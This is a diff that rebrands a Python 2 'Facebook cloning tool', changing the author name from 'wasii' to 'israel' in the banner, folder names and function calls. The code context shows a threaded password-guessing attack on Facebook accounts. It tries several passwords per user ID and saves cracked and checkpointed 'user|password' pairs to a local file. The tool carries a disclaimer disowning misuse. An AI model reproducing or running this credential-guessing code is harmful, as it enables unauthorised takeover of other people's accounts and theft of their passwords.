@@ -1,6 +1,6 @@
-# Tool : Wasii ( Facebook cloning tool)
-# Author : Waseem Akram ( hackerwasii )
-# github : https://github.com/evildevill
+# Tool : israel ( Facebook cloning tool)
+# Author : israel ezekiel ( hacker_israel )
+# github : https://github.com/Israelezekiel
 # Note : we are not responsible for any misuse
 try:
     import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests
@@ -51,7 +51,7 @@ def wasii(z):
         time.sleep(0.03)
 
 
-banner = '\n\x1b[1;95mTool By Hacker wasii\n We are not responsible for any \nillegal activity\n \n'
+banner = '\n\x1b[1;95mTool By Hacker israel\n We are not responsible for any \nillegal activity\n \n'
 back = 0
 threads = []
 successful = []
@@ -68,7 +68,7 @@ def menu2():
         os.system('clear')
         print '[!] Token Not Found'
         os.system('rm -rf login.txt')
-        os.system('python2 wasi.py')
+        os.system('python2 israel.py')
         time.sleep(1)
 
     try:
@@ -114,7 +114,7 @@ def menu2_menu():
         wasii('Please Wait.')
         wasii('While Is Returning To Main Menu.')
         time.sleep(1)
-        os.system('python2 .wasii.py')
+        os.system('python2 israel.py')
     else:
         print '[!] \x1b[1;91mWrong Input.'
         menu2_menu()
@@ -223,7 +223,7 @@ def choice1_menu():
     def main(arg):
         user = arg
         try:
-            os.mkdir('Hacker_wasii')
+            os.mkdir('Hacker_Israel')
         except OSError:
             pass
 
@@ -237,7 +237,7 @@ def choice1_menu():
                 oks.append(user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
-                crt = open('Hacker_wasii/checkpoint.txt', 'a')
+                crt = open('Hacker_Israel/checkpoint.txt', 'a')
                 crt.write(user + '|' + pass1 + '\n')
                 crt.close()
                 checkpoint.append(user + pass1)
@@ -249,7 +249,7 @@ def choice1_menu():
                     oks.append(user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
                     print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
-                    crt = open('Hacker_wasii/checkpoint.txt', 'a')
+                    crt = open('Hacker_Israel/checkpoint.txt', 'a')
                     crt.write(user + '|' + pass2 + '\n')
                     crt.close()
                     checkpoint.append(user + pass2)
@@ -261,7 +261,7 @@ def choice1_menu():
                         oks.append(user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
                         print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
-                        crt = open('Hacker_wasii/checkpoint.txt', 'a')
+                        crt = open('Hacker_Israel/checkpoint.txt', 'a')
                         crt.write(user + '|' + pass3 + '\n')
                         crt.close()
                         checkpoint.append(user + pass3)
@@ -273,7 +273,7 @@ def choice1_menu():
                             oks.append(user + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
                             print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
-                            crt = open('Hacker_wasii/checkpoint.txt', 'a')
+                            crt = open('Hacker_Israel/checkpoint.txt', 'a')
                             crt.write(user + '|' + pass4 + '\n')
                             crt.close()
                             checkpoint.append(user + pass4)
@@ -285,7 +285,7 @@ def choice1_menu():
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
                                 print '\x1b[1;95m[\x1b[1;95mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
-                                crt = open('Hacker_wasii/checkpoint.txt', 'a')
+                                crt = open('Hacker_Israel/checkpoint.txt', 'a')
                                 crt.write(user + '|' + pass5 + '\n')
                                 crt.close()
                                 checkpoint.append(user + pass5)
@@ -295,8 +295,8 @@ def choice1_menu():
     p = ThreadPool(30)
     p.map(main, id)
     print '\x1b[1;94m----------------------------------------------'
-    wasii('[\xe2\x9c\x93] \x1b[1;92mProcess Has Been Completed.')
-    wasii('\x1b[1;92m[\xe2\x9c\x93] Checkpoint IDS Has Been Hacker_wasiid.')
+    israel('[\xe2\x9c\x93] \x1b[1;92mProcess Has Been Completed.')
+    israel('\x1b[1;92m[\xe2\x9c\x93] Checkpoint IDS Has Been Hacker_Israel.')
     xx = str(len(oks))
     xxx = str(len(checkpoint))
     print '[\xe2\x9c\x93] \x1b[1;95mTotal \x1b[1;32mOK/\x1b[1;97mCP : \x1b[1;32m' + str(len(oks)) + '/\x1b[1;97m' + str(len(checkpoint))
